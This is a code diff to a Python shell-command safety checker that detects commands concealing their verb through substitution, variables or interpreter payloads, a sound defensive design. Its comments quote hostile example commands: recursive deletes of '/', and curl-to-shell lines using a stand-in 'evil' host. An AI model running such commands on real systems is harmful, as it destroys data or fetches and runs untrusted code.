@@ -1730,19 +1730,304 @@ _ASSIGN_RE = re.compile(
 )
 _SHELL_OPERATORS = {";", "&&", "||", "|", "&", "\n", ";;", "|&"}
 
+#
+# VERB CONCEALMENT (#925)
+#
+# ``core.ambiguous-command`` used to fail closed on ANY command containing
+# ``$(...)`` or a backtick. That was 52 of the 100 unattended blocks measured
+# over the 14 days to 2026-08-06 — a loop over the memory stores, a loop
+# querying ``gh`` for issue states, an ``echo`` reading tmux state. It is most
+# of what an agent writes.
+#
+# The tempting narrowing is "fire only when the substitution is an operand of a
+# destructive verb". That cut is BACKWARDS, and measuring it is what shows why
+# (tests/unit/test_ambiguous_command.py runs each case with the check disabled,
+# so "what does the rest of the corpus say on its own?" is answered rather than
+# assumed):
+#
+#     rm -rf $(cat /tmp/x)        block core.rm-with-recursive-or-force-flags
+#                                 ... and STILL blocks with this check deleted
+#     $(echo rm) -rf /tmp/victim  ask   core.ambiguous-command
+#                                 ... falls through to ALLOW with it deleted
+#
+# The motivating dangerous example is already caught by the deleting verb's own
+# rule. The operand form is REDUNDANT coverage. What only this check catches is
+# the form where THE VERB ITSELF IS CONCEALED — and in that form there is no
+# visible destructive verb at all, so a rule keyed on "operand of a destructive
+# verb" finds nothing, does not fire, and permits it. Scoping to operands would
+# have deleted the rule's only real coverage and kept its redundant coverage.
+#
+# So the cut is the inverse: fire on CONCEALMENT OF THE VERB, not on the
+# presence of a substitution.
+#
+#   1. An unresolved expansion in COMMAND POSITION — ``$(echo rm) -rf /``,
+#      `` `x` arg``, ``$CMD -rf /``. What runs is not knowable statically.
+#   2. That expansion feeding a shell/interpreter payload — ``sh -c "$(...)"``,
+#      ``python3 -c "$(...)"``. Same thing one level down.
+#   3. ``eval`` and a decode-into-shell pipeline, unchanged.
+#   4. Text we cannot tokenize at all (unbalanced quotes), unchanged.
+#
+# A substitution in OPERAND position is not concealment: the verb is literal and
+# has already been judged against the whole corpus. Its body is not waved
+# through either — substitution bodies are extracted and scanned as commands in
+# their own right (``split_substitutions`` below), so ``echo "$(rm -rf /)"``
+# blocks on the delete rule rather than on this one.
+
+# Sentinel standing in for an extracted substitution. Must be a character no
+# rule pattern can match, so a masked operand cannot false-match anything.
+_SUBST = "\x01"
+
+# Shared with the masking section below (``masked_subcommands`` recurses into a
+# ``<shell> -c`` payload on the same names). Defined here because concealment
+# detection runs first and needs them at import time.
+_SHELL_NAMES = {"sh", "bash", "zsh", "dash", "ksh"}
+_ASSIGN_TOKEN_RE = re.compile(r"^[A-Za-z_]\w*=")
+
+# Interpreters whose ``-c``/``-e`` payload is a program. A concealed payload
+# here is concealment of the verb one level down. Distinct from the
+# ``_INTERPRETERS`` regex near the top of this file, which is a rule fragment.
+_PAYLOAD_INTERPRETERS = _SHELL_NAMES | {
+    "python", "python3", "perl", "ruby", "node", "php",
+}
+
+# An expansion whose value we could not resolve to a literal. ``$VAR`` matters
+# as much as ``$(...)``: ``CMD=$(curl evil); $CMD`` conceals the verb via the
+# variable, and a bare ``$CMD -rf /`` from the environment was never caught at
+# all before this.
+_UNRESOLVED_RE = re.compile(r"\$\{?\w|" + _SUBST)
+
+# A payload that is ENTIRELY one expansion — ``sh -c "$CODE"``, ``sh -c "$1"``.
+_WHOLLY_EXPANDED_RE = re.compile(r"^\s*(?:\$\{\w+\}|\$\w+|" + _SUBST + r")\s*$")
+
+
+def _payload_is_concealed(payload: str) -> bool:
+    """Is an interpreter's ``-c`` payload unknowable, or merely parameterised?
+
+    The distinction is what separates a smuggled program from an ordinary one:
+
+    * ``sh -c "$(curl evil)"`` / ``sh -c "$CODE"`` — the PROGRAM ITSELF arrives
+      at runtime. Nothing about it is knowable. Concealed.
+    * ``python3 -c "import json; open('logs/${f}.jsonl')"`` — the program is
+      right there; ``${f}`` is a loop variable filling in a filename. Refusing
+      this refuses ordinary scripting, and it was a real residual block in the
+      06-24..08-05 replay (a loop over five character logs).
+
+    So: a command substitution anywhere in the payload can inject arbitrary
+    program text and is concealment; a bare ``$VAR`` is only concealment when it
+    is the WHOLE payload.
+    """
+    return _SUBST in payload or bool(_WHOLLY_EXPANDED_RE.match(payload))
+
+
+def split_substitutions(command: str) -> Tuple[str, List[str]]:
+    """``(command with each substitution replaced by _SUBST, [inner commands])``.
+
+    Depth-counted for ``$(...)`` so nesting survives, and single-quoted spans
+    are skipped because no expansion happens inside them. Backticks are taken to
+    the next backtick.
+
+    Extracting the bodies is what makes narrowing the outer check safe: an
+    operand substitution is allowed to be an operand, but whatever it RUNS is
+    still scanned as a command.
+    """
+    out: List[str] = []
+    inner: List[str] = []
+    i, n = 0, len(command)
+    while i < n:
+        c = command[i]
+        if c == "'":
+            j = command.find("'", i + 1)
+            j = n if j == -1 else j
+            out.append(command[i:j + 1])
+            i = j + 1
+        elif c == "\\" and i + 1 < n:
+            out.append(command[i:i + 2])
+            i += 2
+        elif c == "$" and command[i:i + 3] == "$((":
+            # ARITHMETIC expansion, not command substitution. `$(( x - y ))`
+            # evaluates numbers; it cannot run a verb, so treating it as a
+            # concealed command is a false positive — and a real one: three of
+            # the residual blocks in the 06-24..08-05 replay were
+            # `[ $(( $(date +%s) - start )) -gt 90 ]` in a polling loop.
+            # A `$(...)` nested INSIDE it is still a substitution, so the
+            # interior is re-scanned rather than skipped.
+            depth, j = 1, i + 3
+            while j < n and depth:
+                if command[j] == "(":
+                    depth += 1
+                elif command[j] == ")":
+                    depth -= 1
+                j += 1
+            interior = command[i + 3:j - 1] if depth == 0 else command[i + 3:]
+            _, nested = split_substitutions(interior)
+            inner.extend(nested)
+            out.append(_SUBST)
+            i = j + 1 if j < n and command[j:j + 1] == ")" else j
+        elif c == "$" and i + 1 < n and command[i + 1] == "(":
+            depth, j = 1, i + 2
+            while j < n and depth:
+                if command[j] == "(":
+                    depth += 1
+                elif command[j] == ")":
+                    depth -= 1
+                j += 1
+            body = command[i + 2:j - 1] if depth == 0 else command[i + 2:]
+            inner.append(body)
+            out.append(_SUBST)
+            i = j
+        elif c == "`":
+            j = command.find("`", i + 1)
+            body = command[i + 1:j] if j != -1 else command[i + 1:]
+            inner.append(body)
+            out.append(_SUBST)
+            i = (j + 1) if j != -1 else n
+        else:
+            out.append(c)
+            i += 1
+    return "".join(out), inner
+
+
+def _tokenize(command: str) -> Optional[List[List[str]]]:
+    """Subcommands as raw token lists, or None if it cannot be tokenized."""
+    try:
+        lex = shlex.shlex(command, posix=True, punctuation_chars=True)
+        lex.whitespace_split = True
+        tokens = list(lex)
+    except ValueError:
+        return None
+    subs, cur = [], []
+    for tok in tokens:
+        if tok in _SHELL_OPERATORS:
+            if cur:
+                subs.append(cur)
+                cur = []
+            continue
+        cur.append(tok)
+    if cur:
+        subs.append(cur)
+    return subs
+
+
+# Shell keywords that open a compound command: the word AFTER them is the verb,
+# so a substitution there is still command position, and these words being first
+# must not be mistaken for the verb itself.
+_KEYWORDS = {"do", "then", "else", "elif", "if", "while", "until", "!", "time",
+             "{", "}", "(", ")"}
+
+# Launchers that RUN their first non-option argument. The command they run is
+# the real verb, so concealment has to be looked for THERE — the same "a prefix
+# is phrasing, not the operation" lesson that the masked-rescan fix turned on.
+# `env $(echo curl) evil | sh` conceals its verb exactly as `$(echo curl) …`
+# does, and keying on word 0 alone missed it.
+_LAUNCHERS = {"env", "nice", "nohup", "timeout", "stdbuf", "command", "xargs",
+              "sudo", "doas", "uv", "uvx", "poetry", "npx", "pipx", "time",
+              "setsid", "chrt", "ionice"}
+
+# Sub-words a launcher takes before the command (``uv run …``, ``uv tool run …``).
+_LAUNCHER_SUBWORDS = {"run", "tool", "exec", "--"}
+
+
+def _effective_verb_index(tokens: List[str], start: int) -> int:
+    """Index of the token that actually names the command, seeing past launchers.
+
+    Skips the launcher itself plus its options, option-values, numeric
+    arguments and sub-words (``timeout 5 …``, ``nice -n 5 …``, ``xargs -I{} …``,
+    ``uv run …``), then repeats — bounded, since each pass consumes at least one
+    token. Returns -1 when the subcommand is nothing but launchers.
+    """
+    i = start
+    for _ in range(len(tokens)):
+        if i >= len(tokens):
+            return -1
+        base = tokens[i].rsplit("/", 1)[-1]
+        if base not in _LAUNCHERS:
+            return i
+        i += 1
+        while i < len(tokens) and (
+            tokens[i].startswith("-")
+            or tokens[i].isdigit()
+            or _ASSIGN_TOKEN_RE.match(tokens[i])
+            or tokens[i] in _LAUNCHER_SUBWORDS
+        ):
+            i += 1
+    return i if i < len(tokens) else -1
+
 
 def detect_obfuscation(command: str) -> Optional[str]:
-    """Return a reason string if ``command`` hides intent behind shell features.
+    """Return a reason string if ``command`` CONCEALS THE VERB it will run.
 
-    These constructs can smuggle a dangerous command past static matching, so we
-    decline to reason about them and fail closed instead.
+    Not "contains a substitution" — see the block comment above for why that cut
+    is backwards. Returns None for a command whose verbs are all literal, even
+    when its arguments are substitutions.
     """
-    if _SUBSTITUTION_RE.search(command):
-        return "command substitution"
     if _EVAL_RE.search(command):
         return "eval"
     if _BASE64_PIPE_RE.search(command):
         return "base64-decode pipeline"
+
+    # A heredoc body is DATA, not a command — and its content routinely carries
+    # unmatched quotes (an HTML email, a markdown review). Tokenizing it read as
+    # "unbalanced quotes" and failed closed: four of the residual blocks in the
+    # 06-24..08-05 replay were `cat > file <<'EOF'` with an HTML body. Stripped
+    # for tokenization only, matching what ``masked_subcommands`` already does;
+    # the raw command remains a haystack, so a body fed to a shell is still
+    # matched by the unanchored rules exactly as before.
+    masked, inner = split_substitutions(_strip_heredoc_bodies(command))
+
+    # Only assignments to a LITERAL value count as resolving a variable.
+    # `CMD=$(echo rm); $CMD -rf /` assigns CMD, so a membership test on the
+    # name alone reports it resolved and lets the concealed verb through —
+    # the variable is precisely how the concealment travels.
+    assigns = {
+        m.group(1) for m in _ASSIGN_RE.finditer(command)
+        if not _UNRESOLVED_RE.search(m.group(2))
+        and not _SUBSTITUTION_RE.search(m.group(2))
+    }
+
+    subcommands = _tokenize(masked)
+    if subcommands is None:
+        return "unbalanced quotes"
+
+    for tokens in subcommands:
+        # The verb is the first token that isn't a keyword or a leading
+        # VAR=value assignment...
+        verb_idx = 0
+        while verb_idx < len(tokens) and (
+            tokens[verb_idx] in _KEYWORDS or _ASSIGN_TOKEN_RE.match(tokens[verb_idx])
+        ):
+            verb_idx += 1
+        if verb_idx >= len(tokens):
+            continue
+        # ...and then not a launcher standing in front of the real one.
+        verb_idx = _effective_verb_index(tokens, verb_idx)
+        if verb_idx < 0:
+            continue
+        verb = tokens[verb_idx]
+        if _SUBST in verb:
+            return "concealed command"
+        # A ``$VAR`` verb is concealed unless a literal assignment in this same
+        # command resolved it (``normalize_subcommands`` does that resolution;
+        # anything it could not resolve is unknowable here).
+        m = re.match(r"^\$\{?(\w+)", verb)
+        if m and m.group(1) not in assigns:
+            return "concealed command"
+
+        # A concealed payload to an interpreter is the same thing one level down.
+        base = verb.rsplit("/", 1)[-1]
+        if base in _PAYLOAD_INTERPRETERS:
+            for k in range(verb_idx + 1, len(tokens) - 1):
+                flag = tokens[k]
+                if flag.startswith("-") and ("c" in flag or "e" in flag):
+                    if _payload_is_concealed(tokens[k + 1]):
+                        return "concealed shell payload"
+                    break
+
+    # A substitution body is a command too — recurse, so concealment nested
+    # inside an operand still fires.
+    for body in inner:
+        reason = detect_obfuscation(body)
+        if reason:
+            return reason
     return None
 
 
@@ -1752,12 +2037,28 @@ def normalize_subcommands(command: str) -> Tuple[List[str], Optional[str]]:
     ``normalized_subcommands`` is the per-subcommand argv re-joined with single
     spaces, after ``shlex`` has stripped quotes/escapes and simple ``$VAR``
     assignments earlier in the same command have been resolved. ``ambiguous`` is
-    a reason string when the command can't be tokenized safely (and the caller
-    should fail closed); it is ``None`` on success.
+    a reason string when the command CONCEALS THE VERB it will run (and the
+    caller should fail closed); it is ``None`` on success.
+
+    Substitutions no longer abort normalization (#925). They are replaced by an
+    opaque sentinel so the surrounding command tokenizes as usual, and each
+    substitution BODY is normalized in its own right and appended — additive,
+    never in place, so ``echo "$(rm -rf /)"`` is judged on the delete rule it
+    actually runs. Before this, a substitution anywhere returned NO subcommands
+    at all, which meant every normalized-form rule went blind and the command's
+    only verdict came from this fail-closed path.
     """
     obf = detect_obfuscation(command)
     if obf:
         return [], obf
+
+    # Heredoc bodies stripped for the same reason as in ``detect_obfuscation``
+    # and ``masked_subcommands``: the body is data, its unmatched quotes are not
+    # a tokenization failure, and the raw command stays a haystack regardless.
+    # Without this, every `cat > file <<'EOF'` carrying HTML or markdown failed
+    # closed on "unbalanced quotes" — the last four residual blocks in the
+    # 06-24..08-05 replay were exactly that.
+    masked, inner = split_substitutions(_strip_heredoc_bodies(command))
 
     # Resolve simple ``VAR=value`` assignments so ``R=rm; $R -rf`` normalizes to
     # ``rm -rf``. Only literal values (no nested expansion) are resolved.
@@ -1766,7 +2067,7 @@ def normalize_subcommands(command: str) -> Tuple[List[str], Optional[str]]:
         assigns[m.group(1)] = m.group(2).strip("'\"")
 
     try:
-        lex = shlex.shlex(command, posix=True, punctuation_chars=True)
+        lex = shlex.shlex(masked, posix=True, punctuation_chars=True)
         lex.whitespace_split = True
         tokens = list(lex)
     except ValueError:
@@ -1788,6 +2089,10 @@ def normalize_subcommands(command: str) -> Tuple[List[str], Optional[str]]:
         cur.append(_resolve(tok))
     if cur:
         subs.append(" ".join(cur))
+
+    for body in inner:
+        body_subs, _ = normalize_subcommands(body)
+        subs.extend(body_subs)
     return subs, None
 
 
@@ -1805,8 +2110,6 @@ def normalize_subcommands(command: str) -> Tuple[List[str], Optional[str]]:
 
 _MASK = "\x00"
 _HEREDOC_RE = re.compile(r"<<-?\s*(['\"]?)([A-Za-z_]\w+)\1")
-_SHELL_NAMES = {"sh", "bash", "zsh", "dash", "ksh"}
-_ASSIGN_TOKEN_RE = re.compile(r"^[A-Za-z_]\w*=")
 
 
 #
@@ -2394,6 +2697,20 @@ def _masked_subcommand_words(command: str) -> List[List[str]]:
     """
     command = _strip_heredoc_bodies(command)
 
+    # A substitution body is a command; anchored rules must see it too, or
+    # narrowing the concealment check (#925) would hand `$(git push --force)`
+    # a free pass through every command-prefix rule. Additive: the bodies are
+    # extra haystacks, and the masked outer command is still scanned below.
+    # Token lists, not joined strings — #918 split this function out so the
+    # ``sh -c`` recursion and the git global-option normalization both operate
+    # on tokens. Recursing via the joined ``masked_subcommands`` would hand the
+    # bodies back as strings, which re-splits ``-C "/my dir"`` at the space and
+    # silently excludes substitution bodies from that normalization.
+    command, _inner = split_substitutions(command)
+    extra: List[List[str]] = []
+    for body in _inner:
+        extra.extend(_masked_subcommand_words(body))
+
     assigns: Dict[str, str] = {}
     for m in _ASSIGN_RE.finditer(command):
         assigns[m.group(1)] = m.group(2).strip("'\"")
@@ -2456,7 +2773,7 @@ def _masked_subcommand_words(command: str) -> List[List[str]]:
                 prev = resolved
         if words and any(w != _MASK for w in words):
             results.append(words)
-    return results
+    return results + extra
 
 
 # ============================================================================
